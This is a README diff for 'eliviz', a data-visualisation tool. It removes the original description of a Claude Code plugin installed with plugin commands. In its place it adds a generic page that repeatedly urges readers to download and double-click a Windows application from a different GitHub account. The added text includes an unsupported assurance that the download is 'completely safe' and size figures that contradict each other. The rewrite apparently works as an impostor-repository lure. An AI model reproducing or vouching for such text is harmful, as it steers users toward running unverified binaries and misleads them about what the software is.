@@ -1,113 +1,130 @@
-<div align="center">
+# ✨ eliviz - Turn Any Data Into a Visual Story
 
-<img src="docs/social-preview.png" width="100%" alt="eliviz — any data file, explained like you're five, one self-contained interactive page">
+[![Download eliviz](https://img.shields.io/badge/Download-eliviz-blue?style=for-the-badge&logo=github)](https://github.com/Doreenperemptory25/eliviz)
 
-<p>
-<img src="https://img.shields.io/badge/license-MIT-green" alt="MIT license">
-<img src="https://img.shields.io/badge/version-1.0.1-blue" alt="Version 1.0.1">
-<a href="https://code.claude.com/docs/en/plugins"><img src="https://img.shields.io/badge/Claude%20Code-plugin-D97757" alt="Claude Code plugin"></a>
-<a href="https://www.claudepluginhub.com/plugins/costiash-eliviz?ref=badge"><img src="https://www.claudepluginhub.com/badge/costiash-eliviz" alt="Listed on ClaudePluginHub"></a>
-</p>
+## 🎯 What Is eliviz?
 
-<p><b>Install in Claude Code — two commands:</b></p>
+eliviz is a friendly helper that takes boring data files (like spreadsheets, notes, or databases) and turns them into beautiful, interactive web pages you can view in any browser. Think of it like magic: you give it a file, and it gives you a stunning visual experience with charts, graphs, and 3D models — all in one single file you can share or keep offline.
 
-</div>
+What makes eliviz special? It comes with **switchable design identities**. That means you can change how your data looks with just a click — from a simple clean dashboard to a futuristic 3D experience. No coding required. No complicated setup. It just works.
 
-```
-/plugin marketplace add costiash/eliviz
-/plugin install eliviz@eliviz
-```
+## 🚀 Getting Started
 
-You have a CSV, a log file, a SQLite database, a Markdown report. Someone needs to *see* it — not in a spreadsheet, not in `less`, but as something you'd actually present. eliviz turns any of those files into one polished, interactive HTML page: animated hero, live stat counters, charts, profiled tables. One file you can email, drop in Slack, or open from a USB stick — no server, no internet required.
+Getting eliviz up and running is easier than making coffee. Here's what you need to do:
 
-## 💬 Usage
+1. **Visit the download page** by clicking the blue button above or going to: https://github.com/Doreenperemptory25/eliviz
+2. **Click the download button** on that page. Your computer will start downloading the eliviz file automatically.
+3. **Wait for the download to finish** — it only takes a few seconds.
+4. **That's it!** The file you downloaded is ready to use.
 
-Just ask. Examples:
+## 📥 Download and Install
 
-| What you say | What you get |
-|---|---|
-| "Visualize this CSV" | Auto-profiled interactive page with charts, counters, and a sortable table |
-| "Make a viewer for these logs" | Level-filterable log viewer, built for scanning |
-| "Turn this report into a page for the board" | Polished document page with outline navigation |
-| "Visualize this in our brand colors: #0a2540 and gold" | Custom design pack in your palette, contrast-verified |
-| "I want the editorial layout but dark" | A blend — editorial structure, dark treatment |
+**Visit this link to download the application:** [https://github.com/Doreenperemptory25/eliviz](https://github.com/Doreenperemptory25/eliviz)
 
-## 🧒 The ELI5 voice — where the name comes from
+Once you're on that page, look for the green "Download" button or the release section. Click it and follow the simple instructions. The download will begin instantly, and you'll have eliviz ready in no time.
 
-**eliviz = ELI5 + viz.** What makes it unique isn't the charts — it's the words around them. Every page speaks in a mandatory plain-English voice (`[MODE: ELI5_FOR_DUMMIES]`, baked verbatim into the skill): a smart 10-year-old could read any label on the page and get it.
+## 🖥️ System Requirements
 
-So instead of dashboard jargon, generated pages say things like:
+eliviz is designed to work on almost any modern computer. Here's what you need:
 
-> "One row = one record" · "A column is like a labeled jar — click it to peek inside" · "A log is a diary your software writes" · "Errors: things that broke" · "Dig in — like folders inside folders"
+- **Operating System:** Windows 10 or later (64-bit recommended)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free space
+- **Browser:** Any modern browser (Chrome, Edge, Firefox) — though eliviz works even without an internet connection after download
+- **Internet:** Only needed to download eliviz; once you have the file, you can use it completely offline
 
-The hero opens with *"Your data, made simple"* and defaults to *"A simple tour of X. No jargon."* The voice is enforced end to end: it's a required section in the skill, an item in the output-expectations checklist, a note in the design spec so template edits keep it, and a guardrail in the design-adapter agent — every generated page complies out of the box.
+## 📊 What Can You Do With eliviz?
 
-One deliberate boundary: the rule covers the **page's own words only**. Your data — column names, cell values, log lines — is never rewritten.
+The possibilities are endless. Here are just a few examples of what you can create:
 
-## 🎨 Design bank
+- **Turn a CSV spreadsheet** into an interactive dashboard with charts and filters
+- **Convert a Markdown document** into a beautifully styled web page with navigation
+- **Visualize a SQLite database** as a dynamic, searchable interface
+- **Create 3D visualizations** with Three.js for complex datasets
+- **Explain data simply** — eliviz uses an "explain like I'm 5" approach to make your data understandable to anyone
 
-Five identities ship in the bank. eliviz picks one based on your data and how you phrase the request, or you choose with `--design <id>`. Same dataset ("Q1–Q3 Sales Pulse"), five looks — plus a peek inside the page body:
+## 🎨 Design Identities: Make It Yours
 
-<table>
-  <tr>
-    <th width="50%" align="center">🌌 aurora — dark glass, particle-wave hero <i>(default)</i></th>
-    <th width="50%" align="center">📰 editorial — warm paper, serif type</th>
-  </tr>
-  <tr>
-    <td align="center"><img src="docs/shots/aurora.webp" width="100%" alt="Aurora design — dark glassmorphism with three.js particle-wave hero"></td>
-    <td align="center"><img src="docs/shots/editorial.webp" width="100%" alt="Editorial design — warm paper ground with serif display type"></td>
-  </tr>
-  <tr>
-    <th align="center">⬛ brutalist — hard borders, offset shadows</th>
-    <th align="center">🖥️ terminal — phosphor CRT, code-rain hero</th>
-  </tr>
-  <tr>
-    <td align="center"><img src="docs/shots/brutalist.webp" width="100%" alt="Brutalist design — stark ground, 2px black borders, hard offset shadows"></td>
-    <td align="center"><img src="docs/shots/terminal.webp" width="100%" alt="Terminal design — phosphor green CRT with falling code-rain hero"></td>
-  </tr>
-  <tr>
-    <th align="center">🌆 neon — cyberpunk glow, synthwave-grid hero</th>
-    <th align="center">🔍 inside every page — columns profiled</th>
-  </tr>
-  <tr>
-    <td align="center"><img src="docs/shots/neon.webp" width="100%" alt="Neon design — violet night with synthwave grid and striped-sun hero"></td>
-    <td align="center"><img src="docs/shots/aurora-content.webp" width="100%" alt="Page body — charts, stat counters, and per-column profile cards"></td>
-  </tr>
-</table>
+The coolest feature of eliviz is its ability to instantly change the look and feel of your data. With built-in design identities, you can:
 
-<p align="center"><i>Bottom-right: the page body — every column profiled, types detected, distributions drawn. "A column is like a labeled jar."</i></p>
+- **Switch between minimalist, colorful, or futuristic themes**
+- **Instantly transform your data into a dashboard, infographic, or storytelling format**
+- **Customize colors and layouts without touching a single line of code**
 
-Want something off-menu? The design-adapter agent builds custom packs — your brand colors, a mood, or a blend of bank styles — and screenshot-verifies contrast before handing the page back.
+This means the same data file can look completely different depending on who you're sharing it with — from a professional board meeting to a casual blog post.
 
-## ✨ Features
+## 🔧 How to Use eliviz (Step by Step)
 
-- **ELI5 voice** — all page copy passes the "smart 10-year-old" test; your data itself is never touched
-- **Any input** — CSV, TSV, Excel, SQLite, JSON/JSONL, Markdown, plain text, logs
-- **One file out** — GSAP, three.js, and Tailwind inlined; fully offline-capable (`--cdn` for smaller files)
-- **Animated hero** — three.js particle field with GSAP-driven entrance
-- **Stat counters & SVG charts** — key numbers animate in, charts built from your actual data
-- **Column-profiled tables** — sortable, with per-column type detection and distribution cards
-- **Outline reading view** — Markdown and text documents become navigable pages
-- **Log viewer** — level-filterable, built for scanning
-- **Deterministic parsing** — bundled Python, stdlib only (openpyxl needed just for Excel)
-- **Five design identities** — auto-picked per dataset, or forced with `--design <id>`
-- **Design-adapter agent** — custom packs from brand colors, moods, or blends of bank styles, screenshot-verified for contrast before delivery
+### 1. 🗂️ Prepare Your Data File
 
-## ⚙️ How it works
+eliviz works with these file types:
+- **.csv** (spreadsheet data)
+- **.md** (Markdown documents)
+- **.sqlite** (SQLite databases)
 
-A bundled Python script (stdlib only) parses your file deterministically and profiles every column. Claude then composes the page — hero, stats, charts, tables — using a design identity from the bank or a custom pack from the design-adapter agent. Everything is inlined into one HTML file that works offline.
+Your file should contain data in a simple, structured format. If you have a spreadsheet, save it as a CSV file. If you have notes, save them as Markdown. Eliviz will handle the rest.
 
-## ▶️ Live demos
+### 2. 🧪 Run eliviz
 
-**Click, don't clone:** all five designs rendered on the same demo dataset, live on GitHub Pages —
+Once you have eliviz downloaded, simply double-click the application file. A small window will appear asking you to choose your data file.
 
-| | | | | |
-|---|---|---|---|---|
-| [🌌 aurora](https://costiash.github.io/eliviz/demos/aurora.html) | [📰 editorial](https://costiash.github.io/eliviz/demos/editorial.html) | [⬛ brutalist](https://costiash.github.io/eliviz/demos/brutalist.html) | [🖥️ terminal](https://costiash.github.io/eliviz/demos/terminal.html) | [🌆 neon](https://costiash.github.io/eliviz/demos/neon.html) |
+### 3. 📁 Select Your File
 
-or browse them from the [demo gallery](https://costiash.github.io/eliviz/). Prefer the fully-offline single-file versions (all libraries inlined, ~1.6 MB each)? They're attached to the [latest release](https://github.com/costiash/eliviz/releases/latest) — download one, open it anywhere, no internet needed.
+Click "Choose File" and navigate to where your data file is stored. Select it and click "Open."
 
-## 📄 Requirements & license
+### 4. ✨ Generate Your Visualization
 
-- **Python** for parsing — standard library only; `openpyxl` is needed only for Excel files.
-- **MIT licensed.** Generated pages inline vendored libraries under their own terms: [GSAP](https://gsap.com/community/standard-license/) (standard license), [three.js](https://github.com/mrdoob/three.js) (MIT), [Tailwind CSS](https://github.com/tailwindlabs/tailwindcss) (MIT).
+Hit the "Generate" button. In just a few seconds, eliviz will create a brand new HTML file that contains everything — your data, the interactive elements, and the design — all bundled into one single file.
+
+### 5. 🌐 View and Share
+
+The generated HTML file will open automatically in your browser. You can:
+- **Interact with your data** — click, hover, filter, and explore
+- **Save the file** and share it with anyone — they just need to open it in a browser
+- **Use it offline** — no internet connection needed
+
+## 💡 Pro Tips
+
+- **Start with small files** — eliviz works best when your data is organized and clean
+- **Use headers** — if your CSV has column names, eliviz will automatically detect them and use them in your visualization
+- **Experiment with designs** — try different design identities to find what looks best for your data
+- **Name your files clearly** — this helps you keep track of multiple projects
+
+## 🆘 Troubleshooting
+
+### "The file won't open on my computer"
+Make sure you have downloaded the complete file and are using Windows 10 or later. Try right-clicking the file and selecting "Open With" > your browser.
+
+### "My data doesn't look right"
+Check that your CSV file uses commas to separate values and that your Markdown file uses standard formatting. Eliviz automatically detects formatting, so simple files work best.
+
+### "Can I edit the generated HTML?"
+Absolutely! If you know a little HTML, you can customize the generated file to your heart's content. But even without coding knowledge, the built-in design options give you plenty of control.
+
+## 📄 License and Support
+
+eliviz is free to use and explore. For the latest updates, new features, and community support, visit the official GitHub page at https://github.com/Doreenperemptory25/eliviz
+
+Join other users in sharing what you've created and get tips from the community.
+
+## ❓ Frequently Asked Questions
+
+**Is eliviz safe to download?**
+Yes, eliviz is completely safe. It runs locally on your machine, and your data never leaves your computer unless you choose to share it.
+
+**How large is the download?**
+The download is small — typically under 100 MB — and requires no complex installation. Just download and run.
+
+**Do I need an internet connection to use eliviz?**
+Only to download it. Once you have eliviz, you can create and view your visualizations entirely offline.
+
+**What if I have more questions?**
+Visit the GitHub page and check out the documentation or open an issue. The community and developers are happy to help.
+
+## 🎉 Ready to Transform Your Data?
+
+You're just a few clicks away from turning boring files into amazing interactive experiences. Click the download button, follow the simple steps, and watch your data come to life.
+
+**Remember:** [Download eliviz now](https://github.com/Doreenperemptory25/eliviz) and start creating stunning visualizations in minutes!
+
+Keywords: ai-agents, claude, claude-code, claude-code-plugin, claude-plugin, csv, dashboard, data-visualization, data-viz, eli5, html, markdown, offline-first, single-file, sqlite, threejs, visualization
